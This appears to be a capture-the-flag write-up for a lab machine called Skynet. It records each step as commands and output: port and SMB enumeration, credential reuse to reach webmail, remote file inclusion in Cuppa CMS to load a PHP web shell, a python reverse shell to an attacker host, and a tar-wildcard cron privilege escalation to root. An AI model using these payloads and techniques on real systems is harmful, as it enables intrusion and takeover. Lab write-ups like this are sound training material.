## MACHINE IP
```bash
10.201.42.65
```
## NMAP SCAN
```bash
# Nmap 7.95 scan initiated Fri Sep 26 13:10:22 2025 as: /usr/lib/nmap/nmap -Pn -p- -sV -sC -v -T5 --open --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 -oN nmap/scan-script-version 10.201.42.65
Nmap scan report for 10.201.42.65
Host is up (0.30s latency).
Not shown: 65488 closed tcp ports (reset), 41 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: SASL RESP-CODES AUTH-RESP-CODE PIPELINING CAPA TOP UIDL
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: Pre-login LOGINDISABLEDA0001 ID LOGIN-REFERRALS post-login listed OK LITERAL+ have SASL-IR capabilities IDLE IMAP4rev1 more ENABLE
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: -1s
| nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   SKYNET<00>           Flags: <unique><active>
|   SKYNET<03>           Flags: <unique><active>
|   SKYNET<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2025-09-26T02:41:22-05:00
| smb2-time: 
|   date: 2025-09-26T07:41:22
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 26 13:11:35 2025 -- 1 IP address (1 host up) scanned in 72.90 seconds

```
## OPEN PORTS - ANALYSIS
```bash
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
```
## RECON
```bash
# Credentials           //Found via enum
milesdyson:cyborg007haloterminator
```
## ENUMERATION
```bash
# SMB 139 445 
- Enumerating share and share files

sudo nxc smb $ip --shares -u 'anonymous' -p ''                                                                                                                                           
SMB         10.201.42.65    445    SKYNET           [*] Unix - Samba (name:SKYNET) (domain:) (signing:False) (SMBv1:True)
SMB         10.201.42.65    445    SKYNET           [+] \anonymous: (Guest)
SMB         10.201.42.65    445    SKYNET           [*] Enumerated shares
SMB         10.201.42.65    445    SKYNET           Share           Permissions     Remark
SMB         10.201.42.65    445    SKYNET           -----           -----------     ------
SMB         10.201.42.65    445    SKYNET           print$                          Printer Drivers
SMB         10.201.42.65    445    SKYNET           anonymous       READ            Skynet Anonymous Share
SMB         10.201.42.65    445    SKYNET           milesdyson                      Miles Dyson Personal Share
SMB         10.201.42.65    445    SKYNET           IPC$                            IPC Service (skynet server (Samba, Ubuntu))       

sudo nxc smb $ip -u 'anonymous' -p '' --spider anonymous --regex .                         

SMB         10.201.42.65    445    SKYNET           [*] Unix - Samba (name:SKYNET) (domain:) (signing:False) (SMBv1:True) 
SMB         10.201.42.65    445    SKYNET           [+] \anonymous: (Guest)
SMB         10.201.42.65    445    SKYNET           [*] Started spidering
SMB         10.201.42.65    445    SKYNET           [*] Spidering .
SMB         10.201.42.65    445    SKYNET           //10.201.42.65/anonymous/. [dir]
SMB         10.201.42.65    445    SKYNET           //10.201.42.65/anonymous/.. [dir]
SMB         10.201.42.65    445    SKYNET           //10.201.42.65/anonymous/attention.txt [lastm:'2019-09-18 08:34' size:163]
SMB         10.201.42.65    445    SKYNET           //10.201.42.65/anonymous/logs [dir]
SMB         10.201.42.65    445    SKYNET           //10.201.42.65/anonymous/logs/. [dir]
SMB         10.201.42.65    445    SKYNET           //10.201.42.65/anonymous/logs/.. [dir]
SMB         10.201.42.65    445    SKYNET           //10.201.42.65/anonymous/logs/log2.txt [lastm:'2019-09-18 10:12' size:0]
SMB         10.201.42.65    445    SKYNET           //10.201.42.65/anonymous/logs/log1.txt [lastm:'2019-09-18 10:11' size:471]
SMB         10.201.42.65    445    SKYNET           //10.201.42.65/anonymous/logs/log3.txt [lastm:'2019-09-18 10:12' size:0]
SMB         10.201.42.65    445    SKYNET           [*] Done spidering (Completed in 3.736093521118164)

# File contents
- //10.201.42.65/anonymous/attention.txt
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
  
- //10.201.42.65/anonymous/logs/log1.txt - Contains random possible password lists

# Running enum4linux
S-1-5-21-2393614426-3774336851-1116533619-1000 SKYNET\milesdyson (Local User)

- Username  milesdyson

# Fuzzing Port 80
sudo ffuf -r -c -w /usr/share/wordlists/dirb/common.txt -fc 404 -u $url/FUZZ | tee fuzz/ffuf-common 
index.html              [Status: 200, Size: 523, Words: 26, Lines: 19, Duration: 308ms]
squirrelmail            [Status: 200, Size: 2912, Words: 298, Lines: 77, Duration: 343ms]   

- Found squirrelmail 1.4.23

- Try using creds from log1.txt and username milesdyson
- Worked creds milesdyson:cyborg007haloterminator
 
- Found Email to change SMB password
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`

# Changing smb password
sudo smbpasswd -U milesdyson -r $ip
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user milesdyson on 10.201.42.65. 
 
# Now check shares using changed creds milesdyson:anonymous and access the share milesdyson
sudo smbclient //$ip/milesdyson -U milesdyson

- Found important.txt under //$ip/milesdyson/notes/important.txt
- File contents
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife

# Access Share /45kra24zxs28v3yd
- Found cuppa CMS 
  
searchsploit cuppa
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion| php/webapps/25971.txt

# RFI Expoit
- Access url 
http://10.201.42.65/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
- Able to view contents via LFI
```
## INITIAL SHELL
```bash
# RFI
- Create a file cmd.php with contents <?php echo system($_GET['cmd']); ?>
- host the file cmd.php using python3 
sudo python3 -m http.server 80

# Web Shell
view-source:http://10.201.42.65/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.13.80.25/cmd.php&cmd=id

# Web Shell to proper shell
- Start Listener
sudo nc -nvlp 444

view-source:http://10.201.42.65/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.13.80.25/cmd.php&cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.80.25",444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

sudo nc -nvlp 444                                                                         
[sudo] password for kali:                                                                     
listening on [any] 444 ...                                                                    
connect to [10.13.80.25] from (UNKNOWN) [10.201.42.65] 37654           
$ id                                        
id                                                                                                                                                                                           
uid=33(www-data) gid=33(www-data) groups=33(www-data)      
```
## PRIVILEGE ESCALATION
```bash
www-data@skynet:/home/milesdyson$ cat /etc/crontab
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh

www-data@skynet:/var/www$ cat /home/milesdyson/backups/backup.sh                               
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *

# tar wildcard privesvc - Reference GTFOBINS
cd /var/www/html
www-data@skynet:/var/www/html$ echo "mkfifo /tmp/lhennp; nc 10.13.80.25 444 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
www-data@skynet:/var/www/html$ echo "" > "--checkpoint-action=exec=sh shell.sh"
www-data@skynet:/var/www/html$ echo "" > --checkpoint=1
www-data@skynet:/var/www/html$ ll

# Now Start a Listener and wait
```
## ROOT | ADMINISTRATOR - PWNED
```bash
sudo nc -nvlp 444
listening on [any] 444 ...
connect to [10.13.80.25] from (UNKNOWN) [10.201.42.65] 37664
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
```
